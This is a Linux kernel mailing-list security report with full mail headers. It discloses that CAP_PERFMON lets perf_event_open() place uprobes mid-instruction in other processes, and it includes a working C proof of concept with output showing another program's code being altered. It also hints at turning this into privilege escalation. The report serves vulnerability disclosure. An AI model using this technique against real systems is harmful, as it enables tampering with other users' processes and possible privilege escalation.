Received: from mail-ed1-f49.google.com (mail-ed1-f49.google.com [209.85.208.49])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 3C4261DDA1E
	for <linux-security-module@vger.kernel.org>; Tue,  1 Jul 2025 16:15:30 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.208.49
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1751386532; cv=none; b=pk/euyD1zgfpjNNMpuesNB499/T59o0bIDTaS+Wvfc8yi/rAR/RVNNZ4sWbNQmqQR1Kf9Cq2E/SbX58bbxMrjjNRCp7lnWJP1xCiFY9gbSjQvsBXvJq+bD4m5CGWpkUc3SnBRq/DcOkk+QfOvePsphlTNfw3M2yDNlI4X1b+k8Y=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1751386532; c=relaxed/simple;
	bh=ePNvsJWMB7h/ETcQG52j+JzM5hJF057zzK9fuDX7oeE=;
	h=MIME-Version:From:Date:Message-ID:Subject:To:Cc:Content-Type; b=ah8w9pIX5uvGxV19WeYGk4iieOIp/7Lr5uF+eFkbhxiu+7z4PJHhXPxm4/yJh9/S1mW7La0fBFeIjqg3oJAVKPQ2c5ABGutQ7wKH8sfDyDDyYWeSA2GgYoYhbTXGdWs6tl+o1apGK5+MhhRk9z88ZuOtTSUvmPQ3QU09WKHFQd0=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=google.com; spf=pass smtp.mailfrom=google.com; dkim=pass (2048-bit key) header.d=google.com header.i=@google.com header.b=Kkl6fRl2; arc=none smtp.client-ip=209.85.208.49
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=google.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=google.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=google.com header.i=@google.com header.b="Kkl6fRl2"
Received: by mail-ed1-f49.google.com with SMTP id 4fb4d7f45d1cf-60b86fc4b47so11805a12.1
        for <linux-security-module@vger.kernel.org>; Tue, 01 Jul 2025 09:15:29 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20230601; t=1751386528; x=1751991328; darn=vger.kernel.org;
        h=cc:to:subject:message-id:date:from:mime-version:from:to:cc:subject
         :date:message-id:reply-to;
        bh=qSOuw05jeizU4+BFa/C/rUZVOHWeHSG3w1UgOQWvnQc=;
        b=Kkl6fRl2vfkgHkLmPW9Z6BvghB8JZv03fAwC+vcQFGXW7b4lEQk84BMkshxDGTUn9j
         Ihtl3nzWPKH/p6FJqCtSALqLhsd8pEeNvyv8f5bp3JRx2v0DNOJ8Cj+x8lEV5jwiuL9c
         t9nGq5bb5MUo+SUio3FXPmz0cTS+crWlTknzgJxmZbhpOH4pC7fnALU1pHSRG65qZ3MJ
         N5BiaTgFPEe2XgEIXA2RSYKRsakJ1RSYdarCBg8nNbwV0C2YZedPWGhkZrP2PoZhn1HS
         FzjDSVm24oHmgE+PCXOOXLX3uDViD7t5Z7/kMxITOOyvPZeAiI0x8H/BKmD9qAq4zSKQ
         Q27w==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1751386528; x=1751991328;
        h=cc:to:subject:message-id:date:from:mime-version:x-gm-message-state
         :from:to:cc:subject:date:message-id:reply-to;
        bh=qSOuw05jeizU4+BFa/C/rUZVOHWeHSG3w1UgOQWvnQc=;
        b=oMbkmCcfM60vInH9fryySHUpNIKVw3GitiKDrANHBh7+OMJcmDdga9HrJ32bpS6+5P
         c/N/Q/+dZH3lbwEmqce8MYBYjsOhWE9G1KQCmHtQE4Rf3nPkpq1lOknEysCbxRdABFS7
         hSmp+25qKe3a/kWtQoqTGbcHHX5rbDZAK7DUWO1QFxUJtT21jVMOcp9ss7tmLmZ1eCJB
         nfNxqowp1AkXFbks/kw5plxyLjs3p1YY7BGYXX1eR7tp9o1emr1rj4X1jcgSdyO2ZRE6
         0w/9tJ3ZlJJfD3MuamXQg5+/qRXnHYtQJFDm+6QwXNg69Pu1MFnUwMWJZcTE0Q6EKX70
         ic4A==
X-Forwarded-Encrypted: i=1; AJvYcCWz02qmXTXLCV57cMzxTN7xGhwOnhySqwJNz9baKf62qlPV74K5Hk4Pxnfl/OD5o7jIwT68xU0DCR1OUu8gS9RwwfNUY1w=@vger.kernel.org
X-Gm-Message-State: AOJu0YyWuLW6z9nbfzlzipZzxWHyDXcIFOwPTWaffTqe7p1OmLtI+eoe
	ajLMRuIQspmB+GyVnwgYuzIuWlXHYEjrlUO9K7f6Ejjx1Vfzo+kZf6zOJtsxX4Zy2gItUBmgKiB
	nHIxHjKR6XGYqkaHEw3oz1ijCNjo3MFZPYCJdfYY3
X-Gm-Gg: ASbGncsGnFEg9+AD/ZMtSNcDbnMlERRG0+Veup9Y80LQ0snw95efcZXRqn+h57zMEh3
	4J3eNBkB1IHGh8n+sISykX2VPNt5hpbo8319qYAky+1ue6FsAKcDRuOTuHC/N08N4VzODEXHxPq
	lce1gUjLC0gyhxAlHxVVb+EiVX1JqPQbpiPnPZh4gDMS5Oh39MZ6hdznfbZt1YLHycn+nOpwo=
X-Google-Smtp-Source: AGHT+IE3OAzY0AYWMa6ga3opq+GIerqoQLh22Tx8fwF4siq//eVxbvzLLCP9m/yj2flxyW1GnjdGPq6nm75VeZ9Pcic=
X-Received: by 2002:a50:d658:0:b0:606:b6da:5028 with SMTP id
 4fb4d7f45d1cf-60e3855ac73mr81191a12.0.1751386527817; Tue, 01 Jul 2025
 09:15:27 -0700 (PDT)
Precedence: bulk
X-Mailing-List: linux-security-module@vger.kernel.org
List-Id: <linux-security-module.vger.kernel.org>
List-Subscribe: <mailto:linux-security-module+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-security-module+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
From: Jann Horn <jannh@google.com>
Date: Tue, 1 Jul 2025 18:14:51 +0200
X-Gm-Features: Ac12FXwmPRbkvmFNG1i_sPZrnv_d9qmh2_pVO8qP_1K0bPtba4WedFzAwZLUN08
Message-ID: <CAG48ez1n4520sq0XrWYDHKiKxE_+WCfAK+qt9qkY4ZiBGmL-5g@mail.gmail.com>
Subject: uprobes are destructive but exposed by perf under CAP_PERFMON
To: Serge Hallyn <serge@hallyn.com>, 
	linux-security-module <linux-security-module@vger.kernel.org>, 
	Peter Zijlstra <peterz@infradead.org>, Ingo Molnar <mingo@redhat.com>, 
	Arnaldo Carvalho de Melo <acme@kernel.org>, Namhyung Kim <namhyung@kernel.org>, 
	Mark Rutland <mark.rutland@arm.com>, 
	Alexander Shishkin <alexander.shishkin@linux.intel.com>, Jiri Olsa <jolsa@kernel.org>, 
	Ian Rogers <irogers@google.com>, Adrian Hunter <adrian.hunter@intel.com>, 
	"Liang, Kan" <kan.liang@linux.intel.com>, linux-perf-users@vger.kernel.org
Cc: Kernel Hardening <kernel-hardening@lists.openwall.com>, linux-hardening@vger.kernel.org, 
	kernel list <linux-kernel@vger.kernel.org>, 
	Alexey Budankov <alexey.budankov@linux.intel.com>, 
	James Morris <jamorris@linux.microsoft.com>
Content-Type: text/plain; charset="UTF-8"

Since commit c9e0924e5c2b ("perf/core: open access to probes for
CAP_PERFMON privileged process"), it is possible to create uprobes
through perf_event_open() when the caller has CAP_PERFMON. uprobes can
have destructive effects, while my understanding is that CAP_PERFMON
is supposed to only let you _read_ stuff (like registers and stack
memory) from other processes, but not modify their execution.

uprobes (at least on x86) can be destructive because they have no
protection against poking in the middle of an instruction; basically
as long as the kernel manages to decode the instruction bytes at the
caller-specified offset as a relocatable instruction, a breakpoint
instruction can be installed at that offset.

This means uprobes can be used to alter what happens in another
process. It would probably be a good idea to go back to requiring
CAP_SYS_ADMIN for installing uprobes, unless we can get to a point
where the kernel can prove that the software breakpoint poke cannot
break the target process. (Which seems harder than doing it for
kprobe, since kprobe can at least rely on symbols to figure out where
a function starts...)

As a small example, in one terminal:
```
jannh@horn:~/test/perfmon-uprobepoke$ cat target.c
#include <unistd.h>
#include <stdio.h>

__attribute__((noinline))
void bar(unsigned long value) {
  printf("bar(0x%lx)\n", value);
}

__attribute__((noinline))
void foo(unsigned long value) {
  value += 0x90909090;
  bar(value);
}

void (*foo_ptr)(unsigned long value) = foo;

int main(void) {
  while (1) {
    printf("byte 1 of foo(): 0x%hhx\n", ((volatile unsigned char
*)(void*)foo)[1]);
    foo_ptr(0);
    sleep(1);
  }
}
jannh@horn:~/test/perfmon-uprobepoke$ gcc -o target target.c -O3
jannh@horn:~/test/perfmon-uprobepoke$ objdump --disassemble=foo target
[...]
00000000000011b0 <foo>:
    11b0:       b8 90 90 90 90          mov    $0x90909090,%eax
    11b5:       48 01 c7                add    %rax,%rdi
    11b8:       eb d6                   jmp    1190 <bar>
[...]
jannh@horn:~/test/perfmon-uprobepoke$ ./target
byte 1 of foo(): 0x90
bar(0x90909090)
byte 1 of foo(): 0x90
bar(0x90909090)
byte 1 of foo(): 0x90
bar(0x90909090)
byte 1 of foo(): 0x90
bar(0x90909090)
```

and in another terminal:
```
jannh@horn:~/test/perfmon-uprobepoke$ cat poke.c
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <err.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>

int main(void) {
  int uprobe_type;
  FILE *uprobe_type_file =
fopen("/sys/bus/event_source/devices/uprobe/type", "r");
  if (uprobe_type_file == NULL)
    err(1, "fopen uprobe type");
  if (fscanf(uprobe_type_file, "%d", &uprobe_type) != 1)
    errx(1, "read uprobe type");
  fclose(uprobe_type_file);
  printf("uprobe type is %d\n", uprobe_type);

  unsigned long target_off;
  FILE *pof = popen("nm target | grep ' foo$' | cut -d' ' -f1", "r");
  if (!pof)
    err(1, "popen nm");
  if (fscanf(pof, "%lx", &target_off) != 1)
    errx(1, "read target offset");
  pclose(pof);
  target_off += 1;
  printf("will poke at 0x%lx\n", target_off);

  struct perf_event_attr attr = {
    .type = uprobe_type,
    .size = sizeof(struct perf_event_attr),
    .sample_period = 100000,
    .sample_type = PERF_SAMPLE_IP,
    .uprobe_path = (unsigned long)"target",
    .probe_offset = target_off
  };
  int perf_fd = syscall(__NR_perf_event_open, &attr, -1, 0, -1, 0);
  if (perf_fd == -1)
    err(1, "perf_event_open");
  char *map = mmap(NULL, 0x11000, PROT_READ, MAP_SHARED, perf_fd, 0);
  if (map == MAP_FAILED)
    err(1, "mmap error");
  printf("mmap success\n");
  while (1) pause();
jannh@horn:~/test/perfmon-uprobepoke$ gcc -o poke poke.c -Wall
jannh@horn:~/test/perfmon-uprobepoke$ sudo setcap cap_perfmon+pe poke
jannh@horn:~/test/perfmon-uprobepoke$ ./poke
uprobe type is 9
will poke at 0x11b1
mmap success
```

This results in the first terminal changing output as follows, showing
that 0xcc was written into the middle of the "mov" instruction,
modifying its immediate operand:
```
byte 1 of foo(): 0x90
bar(0x90909090)
byte 1 of foo(): 0x90
bar(0x90909090)
byte 1 of foo(): 0x90
bar(0x90909090)
byte 1 of foo(): 0xcc
bar(0x909090cc)
byte 1 of foo(): 0xcc
bar(0x909090cc)
```

It's probably possible to turn this into a privilege escalation by
doing things like clobbering part of the distance of a jump or call
instruction.
